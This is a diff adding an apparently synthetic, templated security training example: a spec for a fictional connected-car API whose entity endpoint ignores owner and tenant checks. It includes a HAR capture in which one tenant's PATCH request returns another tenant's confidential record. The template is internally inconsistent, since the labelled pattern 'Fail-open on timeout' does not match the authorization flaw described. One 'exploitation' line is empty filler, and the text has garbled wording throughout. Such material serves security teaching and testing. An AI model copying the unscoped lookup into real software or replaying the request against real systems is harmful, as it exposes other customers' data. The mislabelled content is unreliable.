@@ -1,0 +1,85 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** AetherDrive V2X Telematics
+**Document Version:** 2.9.0 (FINAL)
+**Classification:** SENSITIVE
+**Domain:** Automotive / Connected Car
+**Architecture:** MQTT + gRPC + REST OTA update pipeline
+**Training Example ID:** BOLA-6304
+
+## 1.0 Executive Summary
+AetherDrive V2X Telematics is a automotive / connected car platform with a REST API. Resources are partitioned
+by `tenant_id` and ownership is tracked via `owner_id`. The API uses JWT authentication
+where the token encodes `sub` (user ID) and `tenant_id`.
+
+## 2.0 Architecture
+- **API:** REST (/api/v2/entitys endpoints)
+- **Auth:** OAuth2 JWT with `sub` and `tenant_id` claims
+- **Database:** PostgreSQL with logical tenant partitioning
+- **Pattern under test:** 8.2 — Fail-open on timeout
+
+## 3.0 Database Schema
+```sql
+
+-- Entity table
+CREATE TABLE entitys (
+    entity_id    VARCHAR(50) PRIMARY KEY,
+    owner_id         VARCHAR(50) NOT NULL REFERENCES users(user_id),
+    tenant_id        VARCHAR(50) NOT NULL,
+    status           VARCHAR(20) DEFAULT 'active',
+    sensitive_data   TEXT,
+    created_at       TIMESTAMP DEFAULT NOW()
+);
+CREATE INDEX idx_entity_tenant ON entitys(tenant_id);
+-- NOTE: Application code does NOT use tenant_id in authorization checks
+
+```
+
+## 4.0 Vulnerability Context
+**Pattern:** 8.2 — Fail-open on timeout (Exceptional)
+
+The `GET/PATCH/DELETE /api/v2/entitys/:id` endpoint accepts a `entity_id` in the URL path.
+The backend handler queries the database by ID only, without filtering by `owner_id` or `tenant_id`.
+An authenticated user from `ORG-741C` can access objects owned by `ORG-D37E`.
+
+_Specific exploitation for Pattern 8.2:_ The `/api/v2/entitys` handler does not enforce tenant/owner boundaries for Pattern 8.2.
+
+## 5.0 Artifact (HAR)
+```json
+{
+  "log": {
+    "version": "1.2",
+    "entries": [
+      {
+        "startedDateTime": "2026-04-13T16:30:35.890353+00:00",
+        "time": 279,
+        "request": {
+          "method": "PATCH",
+          "url": "https://api.aetherdrive-v2x.example.com/api/v2/entitys/ENT-8304",
+          "httpVersion": "HTTP/1.1",
+          "headers": [
+            {"name": "Authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"},
+            {"name": "X-Tenant-ID", "value": "ORG-741C"},
+            {"name": "Accept", "value": "application/json"}
+          ],
+          "queryString": [],
+          "bodySize": 0
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "content": {
+            "mimeType": "application/json",
+            "text": "{\"id\":\"ENT-8304\",\"tenantId\":\"ORG-D37E\",\"ownerId\":\"other-user-741cd37e\",\"sensitiveData\":\"CONFIDENTIAL: cross-tenant data for ORG-D37E\"}"
+          },
+          "bodySize": 240
+        }
+      }
+    ]
+  }
+}
+```
+
+## 6.0 Known Risk Log
+- **RISK-82-6304:** Pattern 8.2 detected in `/api/v2/entitys` handler.
+  The handler was written before the tenant isolation policy was established.
+  Remediation is blocked pending DB migration ticket #DB-6404.
